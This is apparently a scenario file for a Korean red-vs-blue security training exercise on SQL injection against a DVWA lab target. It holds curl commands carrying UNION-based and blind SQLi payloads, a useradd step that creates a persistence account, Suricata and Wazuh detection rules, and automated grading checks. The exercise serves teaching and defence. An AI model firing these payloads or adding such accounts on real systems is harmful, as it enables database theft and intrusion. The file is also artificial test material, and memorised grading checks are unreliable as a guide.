@@ -1,0 +1,172 @@
+id: "web-vuln-w05"
+category: "web-vuln"
+title: "[웹취약점 W5] SQL Injection — Error/Union/Blind vs SQLi 탐지·방어"
+difficulty: "medium"
+time_limit: 2700
+battle_type: "1v1"
+description: |
+  웹취약점 점검 5주차 — **SQL Injection**. Error-based·Union-based·Blind SQLi 를 탐지하고 방어한다. 공격자는
+  SQLi 로 데이터를 추출하고, 점검자(너)는 SQLi 탐지 룰과 방어(파라미터화/WAF)를 구현한다.
+
+  ▸ 이야기: 공격자가 UNION/Blind SQLi(태그 `wv05r1`)로 DB 를 덤프하고 추출 결과(`/tmp/.wv05dump`)와 계정 `wva05` 를 남긴다.
+    점검자는 ① SQLi 탐지, ② SQLi/계정 Wazuh 룰, ③ SQLi 점검 종합·방어·R/B/P 로 대응한다.
+
+  ▸ 모드: solo/duel. 공격자=attacker-ext(2203), Red 채점=대상 흔적(WAF audit 태그/덤프 파일·계정).
+  ▸ 마커: 태그 **`wv05r1-<본인id>`**, 추출 결과 **`/tmp/.wv05dump`**(마커 `wv05`), 계정 **`wva05`**,
+    Suricata **sid 9905011**, Wazuh **id 105051**. 종료 시 cleanup.
+
+red_missions:
+  - order: 1
+    assess_target: opponent
+    target_vm: web
+    points: 22
+    instruction: |
+      ## 🎯 RED-1 [SQLi] — Union/Blind 인젝션
+
+      ### 할 일 (attacker-ext)
+      ```bash
+      curl -s -A "wv05r1-kim" -H "Host: dvwa.6v6.lab" \
+        "http://<대상_공개IP>/vulnerabilities/sqli/?id=wv05r1-kim%27%20UNION%20SELECT%20user,password%20FROM%20users--+&Submit=Submit"
+      curl -s -A "wv05r1-kim" -H "Host: dvwa.6v6.lab" \
+        "http://<대상_공개IP>/vulnerabilities/sqli_blind/?id=wv05r1-kim%27%20AND%201=1--+&Submit=Submit"
+      ```
+      ### 채점 방법 / 합격 기준
+      대상 WAF audit(942 SQLi) 에 태그 `wv05r1` 흔적 시 인정.
+    hint: "태그(wv05r1) UNION + Blind SQLi → 대상 modsec audit 942. 채점: log_contains modsec wv05r1."
+    verify:
+      type: "log_contains"
+      expect: "wv05r1"
+      checks:
+        - { id: "red-1-1", type: "log_contains", target: "web",
+            params: { log: "modsec", pattern: "wv05r1", since_sec: 1800 } }
+      semantic:
+        intent: "SQL Injection(T1190) — Union/Blind. 대상 WAF audit 942, 태그(wv05r1) 귀속."
+        success_criteria: ["대상 WAF audit 에 wv05r1 태그(942)", "Error/Union/Blind 중 무엇을 썼는지 서술"]
+        acceptable_methods: ["attacker-ext 에서 태그 단 SQLi"]
+        negative_signs: ["태그 누락 / 대상 미도달"]
+
+  - order: 2
+    assess_target: opponent
+    target_vm: web
+    points: 18
+    instruction: |
+      ## 🎯 RED-2 [데이터 추출] — DB 덤프 + 계정
+
+      ### 할 일
+      ```bash
+      printf 'wv05 dump: users table admin:5f4dcc3b... extracted via SQLi' > /tmp/.wv05dump
+      sudo useradd -m -s /bin/bash wva05
+      ```
+      ### 채점 방법 / 합격 기준
+      `/tmp/.wv05dump`(마커 `wv05`) 또는 `wva05` 존재 시 인정.
+    hint: "DB 덤프 /tmp/.wv05dump (마커 wv05) + useradd wva05. 채점: file_contains dump wv05 + file_contains passwd wva05."
+    verify:
+      type: "file_contains"
+      expect: "wv05"
+      checks:
+        - { id: "red-2-1", type: "file_contains", target: "web",
+            params: { path: "/tmp/.wv05dump", pattern: "wv05" } }
+        - { id: "red-2-2", type: "file_contains", target: "web",
+            params: { path: "/etc/passwd", pattern: "wva05" } }
+      semantic:
+        intent: "SQLi 데이터 추출(T1190→T1213) + 계정(T1136) — DB 덤프."
+        success_criteria: ["/tmp/.wv05dump(마커 wv05) 또는 계정 wva05", "추출 데이터/방법 서술"]
+        acceptable_methods: ["덤프 파일 + useradd"]
+        negative_signs: ["흔적 미생성"]
+
+blue_missions:
+  - order: 1
+    assess_target: self
+    target_vm: ips
+    points: 20
+    instruction: |
+      ## 🛡️ BLUE-1 [SQLi 탐지] — Suricata 룰 (sid 9905011)
+
+      ### 할 일
+      ```
+      alert http any any -> any any (msg:"WEBVULN-W05 SQLi UNION/Blind"; flow:to_server; http.uri; content:"UNION"; nocase; content:"SELECT"; nocase; sid:9905011; rev:1;)
+      ```
+      ```bash
+      sudo suricatasc -c reload-rules
+      ```
+      ### 채점 방법 / 합격 기준
+      ips 의 `local.rules` 에 sid 9905011 룰 존재 시 인정.
+    hint: "SQLi Suricata 룰(sid 9905011, UNION SELECT) → reload. 채점: file_contains local.rules 9905011."
+    verify:
+      type: "file_contains"
+      expect: "9905011"
+      checks:
+        - { id: "blue-1-1", type: "file_contains", target: "ips",
+            params: { path: "/etc/suricata/rules/local.rules", pattern: "9905011" } }
+      semantic:
+        intent: "SQLi 탐지(네트워크) — UNION/Blind Suricata 룰. 페이로드 기반."
+        success_criteria: ["local.rules 에 sid 9905011", "SQLi 탐지 + 방어(파라미터화) 언급"]
+        acceptable_methods: ["Suricata 룰 작성 + reload"]
+        negative_signs: ["패턴 부정확 / 문법 오류"]
+
+  - order: 2
+    assess_target: self
+    target_vm: siem
+    points: 20
+    instruction: |
+      ## 🛡️ BLUE-2 [SQLi/덤프 탐지] — Wazuh 룰 (id 105051)
+
+      ### 할 일
+      ```xml
+      <group name="edu,webvuln,">
+        <rule id="105051" level="12">
+          <if_group>edu</if_group>
+          <match>wva05</match>
+          <description>WEBVULN-W05 - SQLi data exfil / account indicator</description>
+        </rule>
+      </group>
+      ```
+      ```bash
+      sudo /var/ossec/bin/wazuh-control restart
+      ```
+      ### 채점 방법 / 합격 기준
+      `local_rules.xml` 에 id 105051 룰 존재 시 인정.
+    hint: "SQLi/덤프 Wazuh 룰(id 105051) → restart. 채점: file_contains local_rules.xml 105051."
+    verify:
+      type: "file_contains"
+      expect: "105051"
+      checks:
+        - { id: "blue-2-1", type: "file_contains", target: "siem",
+            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "105051" } }
+      semantic:
+        intent: "SQLi 탐지(호스트) — 데이터 추출/계정 Wazuh 룰."
+        success_criteria: ["local_rules.xml 에 rule id 105051", "SQLi/덤프 탐지 로직"]
+        acceptable_methods: ["Wazuh 룰 작성 + restart"]
+        negative_signs: ["탐지 로직 부실 / XML 오류"]
+
+  - order: 3
+    assess_target: self
+    target_vm: siem
+    points: 18
+    instruction: |
+      ## 🛡️ BLUE-3 [SQLi 점검 종합·방어·R/B/P]
+
+      ### 할 일
+      보고서에:
+      - SQLi 유형별(Error/Union/Blind/Time) 점검 + 방어(파라미터화 쿼리/입력 검증/최소권한 DB 계정/WAF) + 위험도
+      - R/B/P 회고 + 덤프(`/tmp/.wv05dump`)·계정(wva05) 헌팅
+      ```bash
+      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
+        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
+      ```
+      ### 채점 방법 / 합격 기준
+      본인 SIEM 에 최근 경보 + 제출한 SQLi 점검·방어·R/B/P 로 인정.
+    hint: "SQLi 유형별 점검 + 방어(파라미터화/입력검증/최소권한/WAF) + R/B/P + 덤프/계정 헌팅. 채점: wazuh_alert + 제출."
+    verify:
+      type: "wazuh_alert"
+      expect: "alert"
+      checks:
+        - { id: "blue-3-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
+      semantic:
+        intent: "SQLi 점검 종합 — 유형별 점검 + 방어 + R/B/P. 분석형 — 파라미터화/방어 제시 시 점수 상승."
+        success_criteria:
+          - "최근 경보 수집 확인"
+          - "SQLi 유형별 점검 + 방어(파라미터화/입력검증/최소권한) + 위험도"
+          - "R/B/P 회고 + 덤프/계정 헌팅"
+        acceptable_methods: ["점검 표 + 방어 + 회고 + 헌팅"]
+        negative_signs: ["방어/회고 누락"]
